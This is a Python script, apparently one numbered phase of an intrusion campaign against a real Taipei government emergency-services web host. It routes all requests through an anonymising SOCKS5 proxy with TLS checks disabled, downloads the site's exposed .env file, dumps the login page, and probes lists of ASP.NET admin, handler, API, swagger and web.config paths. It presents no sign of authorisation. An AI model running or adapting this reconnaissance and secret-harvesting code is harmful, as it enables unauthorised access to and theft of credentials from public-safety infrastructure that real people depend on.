#!/usr/bin/env python3
"""
Phase 12: Deep dive on fsm.119.gov.taipei via proxy.
Get the .env file, login page HTML, and identify the application framework.
"""
import requests, urllib3, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "socks5h://202.160.76.155:11084",
    "https": "socks5h://202.160.76.155:11084",
}

s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
})

base = "https://fsm.119.gov.taipei"

# 1. Get the .env file content
print("=" * 60)
print("[*] Fetching .env from fsm.119.gov.taipei")
print("=" * 60)
r = s.get(f"{base}/.env", timeout=15, verify=False, allow_redirects=False, proxies=proxies)
print(f"Status: {r.status_code}, Size: {len(r.text)}, Encoding: {r.encoding}")
print("--- .env CONTENT ---")
print(r.text)
print("--- END .env ---")

# 2. Get the real login page
print("\n" + "=" * 60)
print("[*] Fetching /w/fsm119/index (actual login page)")
print("=" * 60)
r = s.get(f"{base}/w/fsm119/index", timeout=15, verify=False, allow_redirects=False, proxies=proxies)
print(f"Status: {r.status_code}, Size: {len(r.headers)}")
print(f"Headers: {dict(r.headers)}")
print("--- BODY (first 5000 chars) ---")
print(r.text[:5000])
print("--- END BODY ---")

# 3. Try common ASP.NET paths
print("\n" + "=" * 60)
print("[*] Probing ASP.NET specific paths")
print("=" * 60)
asp_paths = [
    "/w/fsm119/index", "/w/fsm119/login", "/w/fsm119/admin",
    "/WorkPage.html", "/WebForm1.aspx", "/login.aspx",
    "/admin/login.aspx", "/default.aspx", "/index.aspx",
    "/api/", "/api/login", "/api/values", "/api/test",
    "/swagger", "/swagger/index", "/openapi",
    "/w/", "/w", "/web.config",
]
for path in asp_paths:
    try:
        r = s.get(f"{base}{path}", timeout=8, verify=False, allow_redirects=False, proxies=proxies)
        if r.status_code != 404:
            svr = r.headers.get("Server", "").strip()[:40]
            loc = r.headers.get("Location", "").strip()[:100]
            print(f"  [{r.status_code}] {path} ({len(r.text)}b) [{svr}] loc={loc}")
            if r.status_code == 200 and len(r.text) > 500 and len(r.text) < 10000:
                # Show title if present
                import re
                t = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I)
                if t:
                    print(f"    Title: {t.group(1)[:80]}")
    except:
        pass

# 4. Try to access fsm119 admin area
print("\n[*] Probing fsm119 admin/work pages:")
admin_paths = [
    "/w/fsm119/admin", "/w/fsm119/admin/", "/w/fsm119/admin/login",
    "/w/fsm119/work", "/w/fsm119/work/", "/w/fsm119/work/index",
    "/w/fsm119/dashboard", "/w/fsm119/main",
    "/w/fsm119/UserLogin.aspx", "/w/fsm119/Default.aspx",
    "/w/fsm119/Handler/", "/w/fsm119/ashx/",
    "/w/fsm119/API", "/w/fsm119/api",
    "/w/fsm119/Service/", "/w/fsm119/Handler.ashx",
    "/w/fsm119/WebService/",
]
for path in admin_paths:
    try:
        r = s.get(f"{base}{path}", timeout=8, verify=False, allow_redirects=False, proxies=proxies)
        if r.status_code != 404:
            svr = r.headers.get("Server", "").strip()[:40]
            loc = r.headers.get("Location", "").strip()[:100]
            print(f"  [{r.status_code}] {path} ({len(r.text)}b) [{svr}]")
            if r.text:
                print(f"    Body: {r.text[:300]}")
    except:
        pass
